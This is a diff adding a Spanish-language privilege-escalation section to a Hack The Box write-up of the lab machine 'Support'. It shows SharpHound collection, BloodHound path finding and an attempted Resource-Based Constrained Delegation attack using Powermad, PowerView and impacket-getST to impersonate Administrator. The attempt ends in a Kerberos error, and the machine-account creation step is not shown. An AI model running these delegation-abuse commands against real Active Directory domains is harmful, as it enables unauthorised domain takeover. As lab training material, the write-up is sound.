@@ -373,6 +373,177 @@ Mode                 LastWriteTime         Length Name
 6fa53032c77574ae4b9...
 ```
 
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/514)
+## Escalada de privilegios
+
+Vamos a usar el comando `whoami /all` para ver si tenemos algún privilegio:
+
+```bash wrap=false
+*Evil-WinRM* PS C:\Users\support\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== =============================================
+support\support S-1-5-21-1677581083-3380853377-188903654-1105
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+Estamos en el grupo `Shared Support Accounts`, pero por el resto, no vemos nada interesante. Vamos a usar `bloodhound`, junto con `sharphound` para explorar distintos vectores de ataque.
+
+```bash wrap=false intitle='Máquina Atacante'
+❯ sharphound -h
+
+> sharphound ~ for BloodHound CE collector
+
+/usr/share/sharphound
+├── SharpHound.exe
+├── SharpHound.exe.config
+├── SharpHound.pdb
+└── SharpHound.ps1
+❯ cp /usr/share/sharphound/SharpHound.exe .
+```
+
+```bash wrap=false intitle='Máquina Víctima'
+*Evil-WinRM* PS C:\Users\support\Documents> upload ./exploits/SharpHound.exe
+                                        
+Info: Uploading /home/zelpro/HTB/Support/exploits/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe
+                                        
+Data: 1748308 bytes of 1748308 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe -c All
+2025-10-18T08:54:02.0572354-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2025-10-18T08:54:02.2603392-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
+2025-10-18T08:54:02.3072414-07:00|INFORMATION|Initializing SharpHound at 8:54 AM on 10/18/2025
+2025-10-18T08:54:02.3384574-07:00|INFORMATION|Resolved current domain to support.htb
+2025-10-18T08:54:02.8854052-07:00|INFORMATION|Loaded cache with stats: 16 ID to type mappings.
+ 0 name to SID mappings.
+ 1 machine sid mappings.
+ 3 sid to domain mappings.
+ 0 global catalog mappings.
+2025-10-18T08:54:02.9009774-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
+2025-10-18T08:54:03.0415893-07:00|INFORMATION|Beginning LDAP search for support.htb
+[...]
+2025-10-18T08:54:04.6509512-07:00|INFORMATION|Beginning LDAP search for support.htb Configuration NC
+2025-10-18T08:54:05.2915802-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2025-10-18T08:54:05.2915802-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2025-10-18T08:54:11.0259555-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2025-10-18T08:54:11.0572326-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2025-10-18T08:54:11.1822069-07:00|INFORMATION|Status: 312 objects finished (+312 39)/s -- Using 71 MB RAM
+2025-10-18T08:54:11.1822069-07:00|INFORMATION|Enumeration finished in 00:00:08.1590336
+2025-10-18T08:54:11.2759543-07:00|INFORMATION|Saving cache with stats: 16 ID to type mappings.
+ 0 name to SID mappings.
+ 1 machine sid mappings.
+ 3 sid to domain mappings.
+ 0 global catalog mappings.
+2025-10-18T08:54:11.2759543-07:00|INFORMATION|SharpHound Enumeration Completed at 8:54 AM on 10/18/2025! Happy Graphing!
+```
+
+Ahora nos descargaremos el comprimido que nos ha generado y lo subiremos a `bloodhound`:
+
+![BloodHound](./4.png)
+
+Seguido a esto, buscaremos con la herramienta **Path Finder** una posible ruta de escalada:
+
+![Path Finder](./5.png)
+
+![GenericAll](./6.png)
+
+### Resource-Based Constrained Delegation attack
+
+En el propio `bloodhound`, nos habla del ataque **RBCD**:
+
+![RBCD](./7.png)
+
+Como siempre en [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html), tenemos un artículo explicándonos el ataque. Primero nos descargaremos [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1) y se lo pasamos a la máquina víctima:
+
+```bash wrap=false
+*Evil-WinRM* PS C:\Users\support\Documents> upload ./exploits/Powermad.ps1
+                                        
+Info: Uploading /home/zelpro/HTB/Support/exploits/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1
+                                        
+Data: 180768 bytes of 180768 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
+```
+
+Y simplemente seguimos los pasos, nos descargamos [Powerview.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1):
+
+```bash wrap=false
+*Evil-WinRM* PS C:\Users\support\Documents> upload ./exploits/PowerView.ps1
+                                        
+Info: Uploading /home/zelpro/HTB/Support/exploits/PowerView.ps1 to C:\Users\support\Documents\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
+*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+ 
+*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer SERVICEA | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer SERVICEA -Properties 'msds-allowedtoactonbehalfofotheridentity'
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
+
+Una vez hecho esto, siguiendo la guía de este [repo](https://github.com/tothi/rbcd-attack), usaremos `impacket-getST` para poder impresonarnos como admin:
+
+```bash wrap=false
+❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user SERVICEA$ or initial TGT not forwardable
+```
+
+Me da este error, por lo que la dejaremos en pendiente la escalada.
 
 ---
